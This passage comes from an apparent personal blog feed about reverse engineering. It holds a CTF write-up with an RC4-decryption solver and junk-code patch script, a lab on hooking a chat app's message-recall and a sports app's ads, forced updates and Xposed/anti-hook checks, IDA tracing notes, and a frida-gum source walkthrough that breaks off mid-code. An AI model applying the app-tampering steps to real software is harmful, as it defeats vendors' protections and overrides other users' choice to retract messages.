// c[i]_ = c[i]^c[(i+1)%27]
// c[26]_ = c[26]^c_[0]
unsigned char st[16] = &quot;Hello_Ctfers!!!&quot;;
void O0oo00OOo00o0(unsigned char *m, int mlen, int keylen) &#123;
        unsigned char s[256];
        unsigned char t[256];
        int i;
        for ( i = 0; i &lt; 256; i++) &#123; //初始化s和t向量 
                s[i] = i;
                t[i] = st[i%keylen];
        &#125;        
        int j = 0;
        for ( i = 0; i &lt; 256; i++) &#123;
                j = (j + s[i] + t[i]) % 256;
                swap(s[i],s[j]);
                //根据t向量打乱s盒 
        &#125;
        unsigned char k[64];//保存秘钥流，或者直接进行异或 
        i = 0; j = 0; 
        int tmp;
        int index ;
        for ( index = 0; index &lt; mlen; index++) &#123;   //生成与明文长度一致的秘钥流 
                i = (i + 3) % 256;
                j = (j + s[i]+1) % 256;
                swap(s[i],s[j]); 
                tmp = (s[i] + s[j]) % 256;
                k[index] = s[tmp];//保存秘钥 
        &#125;
        for (i = 0; i &lt; mlen; i++)
        &#123;
                m[i] = m[i] ^ k[i];//主要进行了一步异或，加密的逆过程就是解密 
        &#125;
&#125;
int main()
&#123;
        char c[27]=&#123;0x4d,0xffffffe6,0x49,0xffffff95,0x3,0x2d,0x2b,0xffffffba,0xffffffea,0x6d,0xffffffff,0x59,0x70,0x0,0x1b,0xffffffa9,0x2c,0xffffffb0,0x32,0xffffff98,0x6f,0xffffff8c,0x56,0xffffffa2,0x4c,0x79,0x7f &#125;;
        int i;
        for(i=26;i&gt;=0;i--)
        &#123;
                c[i] = c[(i+1)%27]^c[i];
        &#125;
        for(i=0;i&lt;27;i++)
        &#123;
                printf(&quot;0x%x,&quot;,c[i]) ;
        &#125;
        O0oo00OOo00o0((unsigned char *)c,27,16);
        printf(&quot;\n&quot;);
                for(i=0;i&lt;27;i++)
        &#123;
                printf(&quot;%c&quot;,c[i]&amp;0xff) ;
        &#125;
&#125;
</code></pre>
<p>It base on static crack here, but a bro told me that since there is only <c style="color: #FF0000;">ONE</c>  <code>XOR</code>  that really do something to your flag, you can dynamic debug to get the array  <code>v4</code> . (in the upper encryption photograth) Which is really genius because whether you know how to decrypt rc4 or not you can solve this problem and it do save you tons of work!</p>
<h6 id="just-input-a-series-of-1-and-look-into-the-ecx-register"><a class="markdownIt-Anchor" href="#just-input-a-series-of-1-and-look-into-the-ecx-register">#</a> Just input a series of ‘1’ and look into the  <code>ECX</code>  register!</h6>
<p><img loading="lazy" data-src="hnctfRe/dynamic_1.png" alt="dynamic_1"><br>
<img loading="lazy" data-src="hnctfRe/dynamic_2.png" alt="dynamic_2"><br>
<img loading="lazy" data-src="hnctfRe/dynamic_3.png" alt="dynamic_3"><br>
<img loading="lazy" data-src="hnctfRe/dynamic_4.png" alt="dynamic_4"><br>
<img loading="lazy" data-src="hnctfRe/dynamic_5.png" alt="dynamic_5"></p>
<h5 id="and-so-on"><a class="markdownIt-Anchor" href="#and-so-on">#</a> And so on…</h5>
<pre><code>###### Two thinkings(should be tried out later):
###### Can `angr` solve `rc4` immediately?
###### Can I add a `hook` so it prints the `ECX` rightaway and I don't need to check it once and once again?
######                                                                                          --2022.11.4
</code></pre>
<p>From here, the last few problems are quite hard…</p>
<h3 id="maze"><a class="markdownIt-Anchor" href="#maze">#</a> MAZE</h3>
<p>We found thounds of junkcodes here, and we nop them:</p>
<pre><code>import idc
import idautils
start =0x00140001000
end = 0x00140CEF1F0
bad=[0x50,0x48,0x0f,0xc7,0xf0,0x58]

for i in range(start,end):
    if idc.get_wide_byte(i) == 0x50:
        flag=1
        for j in range(len(bad)):
            if(idc.get_wide_byte(i+j)!= bad[j]):
                flag=0
                break
        if flag==1:
            for j in range(len(bad)):
                patch_byte(i+j,0x90)
                print(&quot;success&quot;)
</code></pre>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>hook某聊天软件lab</title>
    <url>/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/</url>
    <content><![CDATA[<h6 id="起因是在学安卓逆向而且自己水平太低打算练练手-恰巧某友的校内lab做了类似的东西羡慕遂打算动手尝试复现"><a class="markdownIt-Anchor" href="#起因是在学安卓逆向而且自己水平太低打算练练手-恰巧某友的校内lab做了类似的东西羡慕遂打算动手尝试复现">#</a> 起因是在学安卓逆向，而且自己水平太低，打算练练手。恰巧某友的校内 lab 做了类似的东西，羡慕，遂打算动手尝试复现</h6>
<span id="more"></span>
<h4 id="一-某绿色软件防撤回"><a class="markdownIt-Anchor" href="#一-某绿色软件防撤回">#</a> 一、某绿色软件防撤回</h4>
<p>首先搜索相关字串 <code>revoke</code> ，找到一个 <code>RevokeMsgEvent</code> ，看起来很像，然后翻找代码，发现了这个 listener 用于接收一个撤回消息事件</p>
<h5 id="image-20230809174202432"><a class="markdownIt-Anchor" href="#image-20230809174202432">#</a> <img loading="lazy" data-src="hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230809174202432.png" alt="image-20230809174202432"></h5>
<p>观察这里的 callback 函数，先赋值到一个叫做 <code>revokeMsgEvent2</code>  的 class 上（什么鬼命名… 但是看起来可能挺重要的，marked 一下）</p>
<p>接着合法性检测，不需要管</p>
<p>p0.D 的声明如下</p>
<p><img loading="lazy" data-src="hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230809175148467.png" alt="image-20230809175148467"></p>
<p>猜测这里是通知一栏，将原通知的属性修改为已撤回的属性，两者参数 string 声明如下：</p>
<p><img loading="lazy" data-src="hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230809175818647.png" alt="image-20230809175818647"></p>
<p><img loading="lazy" data-src="hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230809175830933.png" alt="image-20230809175830933"></p>
<p>不好懂，接着往下看</p>
<p>可以明确的是这里的 class h 是和撤回相关操作的类，结合下面的调用，猜测这里就是集中处理撤回用的函数（对本地数据库进行了一些操作与删除），查看一下其声明，均是 revoke 的相关操作，那合理来说不会影响正常的流程，直接 hook 就行。</p>
<p><img loading="lazy" data-src="hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230809185208738.png" alt="image-20230809185208738"></p>
<p>这里试一下 <code>frida</code>  脚本 hook 的操作。</p>
<p>首先是这里只有 arm 的包，暂时没有物理机做测试，可以用的方案有三个：AS、qemu、商业模拟器</p>
<table>
<thead>
<tr>
<th>AS</th>
<th>qemu</th>
<th>商业模拟器</th>
</tr>
</thead>
<tbody>
<tr>
<td>开发必备</td>
<td>比较折腾，但是稍微比 AS 效率好一点</td>
<td>运行比较流畅，但是版本选择有限，而且还有很多版本和 hyperV 犯冲，选择更加有限</td>
</tr>
</tbody>
</table>
<p>这里选择先用 AS 尝试了一下，配置如下（一点点尝试可以运行起来的 arm 架构）：<img loading="lazy" data-src="hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810132624458.png" alt="image-20230810132624458"></p>
<p>巨慢无比，还不支持 android studio 的一些便携操作，结果和绿色软件的 so 还不兼容… 麻了…</p>
<p>尝试使用 mumuX（亲测只有 mumux 在本机可以和 WSL2 共存，其他声称支持 hyperV 的都会出问题，待修复），会被检测环境，来尝试配一下 qemu</p>
<p>疑似不太行，毕竟 AS 也是基于 qemu 的，该卡照样卡（据说 mac 上用 as 模拟 android 非常流畅…）</p>
<p>然后发现微软自家的 vs 有安卓模拟器，那来尝试一下下</p>
<h6 id="-to-be-continue"><a class="markdownIt-Anchor" href="#-to-be-continue">#</a> - to be continue</h6>
<h4 id="二-某运动软件广告消除以及强制更新破解"><a class="markdownIt-Anchor" href="#二-某运动软件广告消除以及强制更新破解">#</a> 二、某运动软件广告消除以及强制更新破解</h4>
<h6 id="之前队里一直有跌说加了壳搞不了但是感觉好像么有点机会遂来看看这里是用的一个旧版本好像对root的检测没那么严格但是也能用后面有空再调一个新版本的"><a class="markdownIt-Anchor" href="#之前队里一直有跌说加了壳搞不了但是感觉好像么有点机会遂来看看这里是用的一个旧版本好像对root的检测没那么严格但是也能用后面有空再调一个新版本的">#</a> <s>之前队里一直有跌说加了壳搞不了，但是感觉好像么有点机会，遂来看看，这里是用的一个旧版本，好像对 root 的检测没那么严格，但是也能用，后面有空再调一个新版本的</s></h6>
<p>通过搜索引擎可以找到一个文档，<a href="https://www.csjplatform.com/supportcenter/5398">开屏广告 - Android 集成文档 - 开发测试 - 穿山甲广告平台 (csjplatform.com)</a>，这个 app 的部分广告大概就是基于这个开发的</p>
<p>大概定位到这个类上，是广告加载用的类</p>
<h5 id="image-20230810164814274"><a class="markdownIt-Anchor" href="#image-20230810164814274">#</a> <img loading="lazy" data-src="hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810164814274.png" alt="image-20230810164814274"></h5>
<p>合理来说把这里 hook 一下</p>
<p><img loading="lazy" data-src="hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810165617746.png" alt="image-20230810165617746"></p>
<p>就能消掉大部分和 ad 相关的事件了</p>
<p>但是接着看下去就感觉事情不对头了，这里的 <code>com.fighter.wrapper</code>  疑似只是一个 ad 的处理方法，仔细看左边的包还有一万个不同公司的 ad… 破软件没啥功能，集成的广告不少</p>
<p><img loading="lazy" data-src="hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810171514620.png" alt="image-20230810171514620"></p>
<p>而且后面很多广告用的不是这个方法，那就是不能在这层 hook 了，会累死自己，最好的解决方法还是在调用这 n 个广告类前就掐掉源头</p>
<p>可以搜索发现 <code>com.zjwh</code>  应该是这软件自己的包，命名做的手动混淆，全都是 oO0 啥的…</p>
<p>这里发现了反虚拟环境和反 hook 的操作，那看来后面有点点不好整的</p>
<p><img loading="lazy" data-src="hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810173613500.png" alt="image-20230810173613500"></p>
<p>另外，可以手动调试发现，apk 启动的时候会与 server 交互获取应用更新信息，然后触发强制更新，交互方法疑似使用的 <code>okhttp</code> , 但是 zjwh 包进行了混淆，与服务器也都用的 okhttp 交互，需要一定工作量找到</p>
<p>进度记录：这里仔细找引用和具体的实现方式</p>
<p><img loading="lazy" data-src="hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810212148480.png" alt="image-20230810212148480"></p>
<p>检测 xposed 框架是否存在的方法，也需要 hook 掉</p>
<p><img loading="lazy" data-src="hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810213654727.png" alt="image-20230810213654727"></p>
<p>这个包看起来是比较重要的，下面还有检测攻击等等函数：</p>
<p><img loading="lazy" data-src="hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810214035445.png" alt="image-20230810214035445"></p>
<p>这个包的源码可以找到一个很类似的（虽然只有部分）：</p>
<p><a href="https://mogua.co/view_file/?file=com/ijm/detect/drisk/DRiskNativeTool.java&amp;md5=746753952f66bd8794683d37ccdd2642&amp;type=apk&amp;appname=%E5%BE%97%E7%89%A9&amp;lines=84">DRiskNativeTool.java - 得物.apk 源代码分析 - 摸瓜 (mogua.co)</a></p>
<p>然后顺着搜，可以找到<a href="https://www.ijiami.cn/enindex"> iJiami - Guarding the Smart World | mobile information security service provider</a> 这家公司，专门做安全的，这些安全相关的包就是它家做的了</p>
<h5 id="image-20230810221152187"><a class="markdownIt-Anchor" href="#image-20230810221152187">#</a> <img loading="lazy" data-src="hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810221152187.png" alt="image-20230810221152187"></h5>
<p>到这里就要考虑放弃了，毕竟是商业级的加固，就算级别不高，破解再怎么说也要不小的工程量…</p>
]]></content>
      <tags>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>idaTracing</title>
    <url>/2023/11/12/idaTracing/</url>
    <content><![CDATA[<h6 id="preface上次做tree的时候就在想了这个完全跟不明白且没有思路的玩意搞点记录已经走过的指令或者函数调用栈啥的"><a class="markdownIt-Anchor" href="#preface上次做tree的时候就在想了这个完全跟不明白且没有思路的玩意搞点记录已经走过的指令或者函数调用栈啥的">#</a> PREFACE：上次做 tree 的时候就在想了，这个完全跟不明白且没有思路的玩意，搞点记录已经走过的指令或者函数调用栈啥的</h6>
<h6 id="结果今天才知道ida有这些功能的速速学了"><a class="markdownIt-Anchor" href="#结果今天才知道ida有这些功能的速速学了">#</a> 结果今天才知道 ida 有这些功能的，速速学了</h6>
<span id="more"></span>
<p>首先我还是必须祭出这张图片</p>
<p><img loading="lazy" data-src="idaTracing/image-20231112104323168.png" alt="image-20231112104323168"></p>
<p>然后想要跟这个玩意，当时我是都 hook 上，然后一个一个拆…</p>
<p>然后有这个：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Debugger -&gt; Tracing -&gt; 可以设置指令、基本块或函数的调用trace</span><br></pre></td></tr></table></figure>
<p>tracing windows 里面可以看到这里 traced 的内容，一整个符合需求了，甚至可以给已走过的指令上色</p>
<p><img loading="lazy" data-src="idaTracing/image-20231112104526102.png" alt="image-20231112104526102"></p>
<h6 id="todo研究一下trace的其他功能"><a class="markdownIt-Anchor" href="#todo研究一下trace的其他功能">#</a> TODO：研究一下 trace 的其他功能</h6>
]]></content>
  </entry>
  <entry>
    <title>frida源码初探</title>
    <url>/2024/04/27/frida%E6%BA%90%E7%A0%81%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface被拷打到frida和xpose的原理啥的啥啥不会爬来赶紧学学"><a class="markdownIt-Anchor" href="#preface被拷打到frida和xpose的原理啥的啥啥不会爬来赶紧学学">#</a> PREFACE：被拷打到 frida 和 xpose 的原理啥的，啥啥不会，爬来赶紧学学</h6>
<span id="more"></span>
<h3 id="总览"><a class="markdownIt-Anchor" href="#总览">#</a> 总览</h3>
<p>首先是一整个<a href="https://github.com/frida/frida"> frida</a> 项目可以分为这些 subprojects：</p>
<ul>
<li><a href="https://github.com/frida/frida-clr">frida-clr</a>：Frida .NET bindings</li>
<li><a href="https://github.com/frida/frida-core/tree/da417fd46b4fd7af8f157498e9e5f38e6242be45">frida-core</a>：Frida core library intended for static linking into bindings</li>
<li><a href="https://github.com/frida/frida-go/tree/fd52f64f49fbbde2820e02e6e6dd3aafd1ac0ce6">frida-go</a>：Frida Go bindings</li>
<li><a href="https://github.com/frida/frida-gum/tree/c385fac6e3b2512c64e10e3e039f2a7be6995ab9">frida-gum</a>：Cross-platform instrumentation and introspection library written in C</li>
<li><a href="https://github.com/frida/frida-node/tree/72b815e0fc7fb3ab4dc90e9532739b6dc99c3b8f">frida-node</a>：Frida Node.js bindings</li>
<li><a href="https://github.com/frida/frida-python/tree/91e2e4ff54d7afa4a2d3660019da981e92967e8f">frida-python</a>：Frida Python bindings</li>
<li><a href="https://github.com/frida/frida-qml/tree/5c8eb8c84a5f808cb109e67e80e8e77c4f80da77">frida-qml</a>：Frida Qml plugin</li>
<li><a href="https://github.com/frida/frida-swift/tree/ce8f781ef000b7bfc9f90f942df2d0c973d4f52b">frida-swift</a>：Frida Swift bindings</li>
<li><a href="https://github.com/frida/frida-tools/tree/49f4330d8fde4e5250ac78f35ea71b4d7441fdb6">frida-tools</a>：Frida CLI tools</li>
</ul>
<p>感觉网上许多文章都着重在看 frida-core 和 frida-gum，那么就先看看这两部分</p>
<h3 id="frida-gum"><a class="markdownIt-Anchor" href="#frida-gum">#</a> frida-gum</h3>
<p>分析过程中感觉直接干看还是有点困难，这里先整理一些 frida 所实现的功能，对照着功能看进去</p>
<h4 id="一-前置原理"><a class="markdownIt-Anchor" href="#一-前置原理">#</a> 一、前置原理</h4>
<h5 id="11-inline-hook"><a class="markdownIt-Anchor" href="#11-inline-hook">#</a> 1.1 inline hook</h5>
<p>​		我们可以使用 Frida 的 API 在程序运行时拦截函数的调用，并且在拦截到函数调用时，通过修改函数的参数或者返回值来改变程序的行为。</p>
<p>​		这里的核心原理是：动态替换需要 Hook 的指令片段为一段经过设计的跳板指令，即 trampoline ，目标为我们设计好的一段 shellCode，这里可以看 [<a href="https://bbs.kanxue.com/thread-273273.htm">原创] Frida inlineHook 原理分析及简单设计一款 AArch64 inlineHook 工具 - Android 安全 - 看雪 - 安全社区 | 安全招聘 | kanxue.com</a> 这篇文章对于 Frida 生成的 shellcode 进行了详细的研究，暂时没有进行复现，先纸面学习，大概需要注意的点是：</p>
<ul>
<li>frida 寻找前后 128MB 的地址获取一个空闲地址，将 hook 的点的前 16 个字节（或 4 字节）替换掉为 LDR 和 BR 指令，并且利用 x16 寄存器作为 trampoline 跳板</li>
<li>第一段跳板跳到 shellcode 后 mmap 一段匿名内存，保存当前寄存器状态与用于写入第二段跳板指令</li>
<li>然后是 onenter 和 onleave 的编写，注入 shellcode 实现需求的逻辑即可（这里是简易的核心原理，后面代码会复杂很多）</li>
</ul>
<h6 id="12-inline-hook-检测"><a class="markdownIt-Anchor" href="#12-inline-hook-检测">#</a> 1.2 inline hook 检测</h6>
<p>恰好学习的时候搜到<a href="https://www.cnblogs.com/r0ysue/p/15424821.html">这篇文章</a>，一块记录了</p>
<p>​		既然 frida 会生成 trampoline 和 shellcode，那么有个很简单的方法：开一个线程，检查函数开头有没有被替换过，并且有没有被替换成类似 BR 到 shellcode 的格式</p>
<h4 id="源码"><a class="markdownIt-Anchor" href="#源码">#</a> 源码</h4>
<p>readme 描述：</p>
<p>Cross-platform instrumentation and introspection library written in C.</p>
<p>This library is consumed by <a href="https://github.com/frida/frida-core">frida-core</a> through its JavaScript bindings, <a href="https://github.com/frida/frida-gum/tree/master/bindings/gumjs">GumJS</a>.</p>
<p>然后文档有大概给出不同部分的功能（词汇量稍微有点不够咳咳）不过直接看着稍微有点没头绪，先看看<a href="https://o0xmuhe.github.io/2019/11/15/frida-gum%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB/">别人的分析</a>，这篇写的不错)</p>
<p>偷看一下别人的阅读思路：</p>
<p><img loading="lazy" data-src="frida%E6%BA%90%E7%A0%81%E5%88%9D%E6%8E%A2/image-20240428202138661.png" alt="image-20240428202138661"></p>
<p>首先有个 meson.build 构建文件，其中可以先看 gumtest.c 这一测试运行器（根据 testcase 递归看进代码）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">runner_sources = [</span><br><span class="line">  <span class="string">&#x27;gumtest.c&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;testutil.c&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;stubs&#x27;</span> / <span class="string">&#x27;dummyclasses.c&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;stubs&#x27;</span> / <span class="string">&#x27;fakebacktracer.c&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;stubs&#x27;</span> / <span class="string">&#x27;fakeeventsink.c&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;stalkerdummychannel.c&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;lowlevelhelpers.c&#x27;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h5 id="gumtestc"><a class="markdownIt-Anchor" href="#gumtestc">#</a> gumtest.c</h5>
<p>前面一大段代码根据宏来判断，是用于根据平台信息做初始化的</p>
<p>标记一个核心对象先：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_GumInterceptor</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> GUM_DIET</span></span><br><span class="line">  GObject parent;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  GumObject parent;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  GRecMutex mutex;</span><br><span class="line"></span><br><span class="line">  GHashTable * function_by_address;</span><br><span class="line"></span><br><span class="line">  GumInterceptorBackend * backend;</span><br><span class="line">  GumCodeAllocator allocator;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">volatile</span> guint selected_thread_id;</span><br><span class="line"></span><br><span class="line">  GumInterceptorTransaction current_transaction;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>拦截器初始化</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">GumInterceptor *</span></span><br><span class="line"><span class="function"><span class="title">gum_interceptor_obtain</span> <span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  GumInterceptor * interceptor;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">g_mutex_lock</span> (&amp;_gum_interceptor_lock);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> GUM_DIET</span></span><br><span class="line">  <span class="keyword">if</span> (_the_interceptor != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    interceptor = <span class="built_in">GUM_INTERCEPTOR</span> (<span class="built_in">g_object_ref</span> (_the_interceptor));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _the_interceptor = <span class="built_in">g_object_new</span> (GUM_TYPE_INTERCEPTOR, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">g_object_weak_ref</span> (<span class="built_in">G_OBJECT</span> (_the_interceptor),</span><br><span class="line">        the_interceptor_weak_notify, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    interceptor = _the_interceptor;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="keyword">if</span> (_the_interceptor != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    interceptor = <span class="built_in">gum_object_ref</span> (_the_interceptor);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _the_interceptor = <span class="built_in">g_new0</span> (GumInterceptor, <span class="number">1</span>);</span><br><span class="line">    _the_interceptor-&gt;parent.ref_count = <span class="number">1</span>;</span><br><span class="line">    _the_interceptor-&gt;parent.finalize = gum_interceptor_finalize;</span><br><span class="line">    <span class="built_in">gum_interceptor_init</span> (_the_interceptor);</span><br><span class="line"></span><br><span class="line">    interceptor = _the_interceptor;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">g_mutex_unlock</span> (&amp;_gum_interceptor_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> interceptor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>attach 上函数的方法：</p>
<p>传入地址，调用 <code>gum_interceptor_resolve</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">GumAttachReturn</span></span><br><span class="line"><span class="function"><span class="title">gum_interceptor_attach</span> <span class="params">(GumInterceptor * self,</span></span></span><br><span class="line"><span class="params"><span class="function">                        gpointer function_address,</span></span></span><br><span class="line"><span class="params"><span class="function">                        GumInvocationListener * listener,</span></span></span><br><span class="line"><span class="params"><span class="function">                        gpointer listener_function_data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  GumAttachReturn result = GUM_ATTACH_OK;</span><br><span class="line">  GumFunctionContext * function_ctx;</span><br><span class="line">  GumInstrumentationError error;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">gum_interceptor_ignore_current_thread</span> (self);</span><br><span class="line">  <span class="built_in">GUM_INTERCEPTOR_LOCK</span> (self);</span><br><span class="line">  <span class="built_in">gum_interceptor_transaction_begin</span> (&amp;self-&gt;current_transaction);</span><br><span class="line">  self-&gt;current_transaction.is_dirty = TRUE;</span><br><span class="line"></span><br><span class="line">  function_address = <span class="built_in">gum_interceptor_resolve</span> (self, function_address);</span><br><span class="line"></span><br><span class="line">  function_ctx = <span class="built_in">gum_interceptor_instrument</span> (self, GUM_INTERCEPTOR_TYPE_DEFAULT,</span><br><span class="line">      function_address, &amp;error);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (function_ctx == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">goto</span> instrumentation_error;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">gum_function_context_has_listener</span> (function_ctx, listener))</span><br><span class="line">    <span class="keyword">goto</span> already_attached;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">gum_function_context_add_listener</span> (function_ctx, listener,</span><br><span class="line">      listener_function_data);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">goto</span> beach;</span><br><span class="line"></span><br><span class="line">instrumentation_error:</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> (error)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> GUM_INSTRUMENTATION_ERROR_WRONG_SIGNATURE:</span><br><span class="line">        result = GUM_ATTACH_WRONG_SIGNATURE;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> GUM_INSTRUMENTATION_ERROR_POLICY_VIOLATION:</span><br><span class="line">        result = GUM_ATTACH_POLICY_VIOLATION;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> GUM_INSTRUMENTATION_ERROR_WRONG_TYPE:</span><br><span class="line">        result = GUM_ATTACH_WRONG_TYPE;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">g_assert_not_reached</span> ();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> beach;</span><br><span class="line">  &#125;</span><br><span class="line">already_attached:</span><br><span class="line">  &#123;</span><br><span class="line">    result = GUM_ATTACH_ALREADY_ATTACHED;</span><br><span class="line">    <span class="keyword">goto</span> beach;</span><br><span class="line">  &#125;</span><br><span class="line">beach:</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">gum_interceptor_transaction_end</span> (&amp;self-&gt;current_transaction);</span><br><span class="line">    <span class="built_in">GUM_INTERCEPTOR_UNLOCK</span> (self);</span><br><span class="line">    <span class="built_in">gum_interceptor_unignore_current_thread</span> (self);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟进看这里的实现</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> gpointer</span></span><br><span class="line"><span class="function"><span class="title">gum_interceptor_resolve</span> <span class="params">(GumInterceptor * self,</span></span></span><br><span class="line"><span class="params"><span class="function">                         gpointer address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  address = <span class="built_in">gum_strip_code_pointer</span> (address);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">gum_interceptor_has</span> (self, address))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">const</span> gsize max_redirect_size = <span class="number">16</span>;</span><br><span class="line">    gpointer target;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">gum_ensure_code_readable</span> (address, max_redirect_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Avoid following grafted branches. */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">gum_process_get_code_signing_policy</span> () == GUM_CODE_SIGNING_REQUIRED)</span><br><span class="line">      <span class="keyword">return</span> address;</span><br><span class="line"></span><br><span class="line">    target = _gum_interceptor_backend_resolve_redirect (self-&gt;backend,</span><br><span class="line">        address);</span><br><span class="line">    <span class="keyword">if</span> (target != <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">gum_interceptor_resolve</span> (self, target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> address;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以进到：这部分是比较核心的生成跳转 shellcode 的部分，或许也可以从这部分下手来考虑对抗？(TODO+1)</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">gpointer</span></span><br><span class="line"><span class="function"><span class="title">gum_arm64_reader_try_get_relative_jump_target</span> <span class="params">(gconstpointer address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  gpointer result = <span class="literal">NULL</span>;</span><br><span class="line">  csh capstone;</span><br><span class="line">  cs_insn * insn;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint8_t</span> * code;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line">  <span class="type">uint64_t</span> pc;</span><br><span class="line">  <span class="type">const</span> cs_arm64_op * ops;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">cs_arch_register_arm64</span> ();</span><br><span class="line">  <span class="built_in">cs_open</span> (CS_ARCH_ARM64, GUM_DEFAULT_CS_ENDIAN, &amp;capstone);</span><br><span class="line">  <span class="built_in">cs_option</span> (capstone, CS_OPT_DETAIL, CS_OPT_ON);</span><br><span class="line"></span><br><span class="line">  insn = <span class="built_in">cs_malloc</span> (capstone);</span><br><span class="line"></span><br><span class="line">  code = address;</span><br><span class="line">  size = <span class="number">16</span>;</span><br><span class="line">  pc = <span class="built_in">GPOINTER_TO_SIZE</span> 